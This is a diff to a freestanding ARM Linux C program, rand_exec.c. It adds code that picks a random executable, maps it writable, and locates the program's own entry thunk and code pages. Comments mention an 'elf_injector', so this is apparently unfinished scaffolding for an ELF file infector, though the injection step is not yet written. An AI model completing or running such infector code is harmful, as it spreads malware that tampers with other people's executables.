@@ -1,9 +1,10 @@
-// gcc -g3 -Werror -Wall -Wextra -fno-builtin -std=gnu99 -mgeneral-regs-only -fpie -nostdlib -g3 -o rand_exec rand_exec.c
+// gcc -g3 -Werror -Wall -Wextra -Wno-error=unused-parameter -Wno-error=unused-function -Wno-error=unused-variable -Wconversion -Wno-error=sign-conversion -fno-builtin -std=gnu99 -mgeneral-regs-only -fpie -nostdlib -g3 -o rand_exec rand_exec.c
 #include <unistd.h>
 #include <fcntl.h>
 #include <dirent.h>
 #include <time.h>
 #include <elf.h>
+#include <linux/auxvec.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <syscall.h>
@@ -114,7 +115,7 @@ static unsigned int ret_uidivmod(unsigned int q, unsigned int r)
 {
     (void) q;
     (void) r;
-    __asm(
+    __asm volatile(
         "bx lr"
         );
 }
@@ -171,7 +172,7 @@ static int __aeabi_idiv(int n, int d)
 static void *memset(void *s, int c, usize n)
 {
     u8 *p = s;
-    while (n--) *p++ = c;
+    while (n--) *p++ = (u8) c;
     return s;
 }
 
@@ -189,7 +190,7 @@ __attribute__((naked, returns_twice))
 static int setjmp(jmp_buf buf)
 {
     (void) buf;
-    __asm(
+    __asm volatile(
         "stm r0, { r4-r11, sp, lr }\n"
         "eor r0, r0\n"
         "mov pc, lr\n"
@@ -201,7 +202,7 @@ static void longjmp(jmp_buf buf, int ret)
 {
     (void)buf;
     (void)ret;
-    __asm(
+    __asm volatile(
         "ldm r0, { r4-r11, sp, lr }\n"
         "mov r0, r1\n"
         "mov pc, lr\n"
@@ -271,7 +272,7 @@ static void *alloc(struct arena *a, size sz, size align, size count)
         }
         *a->commit = (u8 *) ((iptr) (a->beg + (PGSIZE - 1)) & ~(PGSIZE - 1));
     }
-    return memset(p, 0, count * sz);
+    return memset(p, 0, (usize) (count * sz));
 }
 
 static long slen(const char *str)
@@ -300,7 +301,7 @@ static struct s8 s8cpy(struct arena *a, struct s8 s)
     r.data = new(a, u8, s.len);
     if (r.len)
     {
-        memcpy(r.data, s.data, r.len);
+        memcpy(r.data, s.data, (usize) r.len);
     }
     return r;
 }
@@ -446,7 +447,7 @@ struct stat64
 {
     u64 st_dev;
     u64 st_ino;
-    i32 st_mode;
+    u32 st_mode;
     u32 st_nlink;
     u32 st_uid;	
     u32 st_gid;	
@@ -512,13 +513,70 @@ cleanup:
     s8unlink(scratch, tname);
 }
 
+struct buf
+{
+    u8  *data;
+    size len;
+};
+
+static bool map_exec(struct arena scratch, struct s8 ename, struct buf *exec)
+{
+    int fd = -1;
+    struct stat64 sbuf;
+    bool mapped = false;
+    if ((fd = s8open(scratch, ename, O_RDWR)) < 0
+        || SYSCALL2(SYS_fstat64, fd, &sbuf) < 0
+        || sbuf.st_size > PTRDIFF_MAX)
+    {
+        goto cleanup;
+    }
+
+    exec->len = (size) sbuf.st_size;
+    exec->data = (u8 *) SYSCALL6(SYS_mmap2, NULL, sbuf.st_size,
+                                 PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+    mapped = true;
+
+cleanup:    
+    SYSCALL1(SYS_close, fd);
+    return mapped;
+}
+
+static volatile size thunk_len = 0x00000001;
+static volatile size code_len = 0x00000002;
+static volatile size thunk_entry_off = 0x00000003;
+static volatile size code_entry_off = 0x00000004;
+
+static bool find_thunk(Elf32_auxv_t *aux, struct buf *thunk)
+{
+    for (Elf32_auxv_t *a = aux; a->a_type != AT_NULL; a++)
+    {
+        if (a->a_type == AT_ENTRY)
+        {
+            thunk->len = thunk_len;
+            thunk->data = (u8 *) a->a_un.a_val - thunk_entry_off;
+            return true;
+        }
+    }
+    return false;
+}
+
+static void find_code(struct buf *code)
+{
+    code->len = code_len;
+    __asm volatile (
+        "mov %[reg], pc\n"
+        : [reg] "=r" (code->data)
+    );
+    code->data = (u8 *) ((iptr) code->data & ~PGSIZE);
+}
+
 // _start offset: XXX
 void start(int argc, char **argv, char **env, Elf32_auxv_t *aux)
 {
     (void) argc;
     (void) argv;
     (void) env;
-    (void) aux;
+    
     jmp_buf ctx;
     struct arena perm = { 0 };
     struct arena scratch = { 0 };
@@ -534,20 +592,38 @@ void start(int argc, char **argv, char **env, Elf32_auxv_t *aux)
         goto cleanup;
     }
 
-    struct s8 tname;
-    if (!pick_exec(&perm, scratch, &tname))
+    struct buf exec = { MAP_FAILED, 0 };
+    struct s8 ename;
+    if (!pick_exec(&perm, scratch, &ename)
+        || !map_exec(scratch, ename, &exec))
     {
         goto cleanup;
     }
 
-    if (SYSCALL3(SYS_write, 1, tname.data, tname.len) < tname.len
+    struct buf thunk;
+    if (!find_thunk(aux, &thunk))
+    {
+        goto cleanup;
+    }
+
+    struct buf code;
+    find_code(&code);
+    
+    // TODO: update elf
+    // TODO: fix elf_injector to use scratch arena
+      
+    if (SYSCALL3(SYS_write, 1, ename.data, ename.len) < ename.len
         || SYSCALL3(SYS_write, 1, "\n", 1) < 1)
     {
         goto cleanup;
     }
-    write_file(scratch, tname);
+//    write_file(scratch, tname);
 
 cleanup:
+    if (exec.data != MAP_FAILED)
+    {
+        SYSCALL2(SYS_munmap, exec.data, exec.len);
+    }
     free_arena(&scratch);
     free_arena(&perm);
 }
@@ -556,7 +632,7 @@ cleanup:
 __attribute__((naked, noreturn))
 void _start(void)
 {
-    __asm(
+    __asm volatile (
         "ldr     r0, [sp]\n"
         "add     r1, sp, #4\n"
         "add     r2, r1, r0, lsl #2\n"
@@ -575,9 +651,3 @@ void _start(void)
         );
 }
 #endif
-
-// r3 = r2 - 4
-// not_zero:
-// r3 += 4
-// load r4 [r3]
-// if not zero branch not_zero
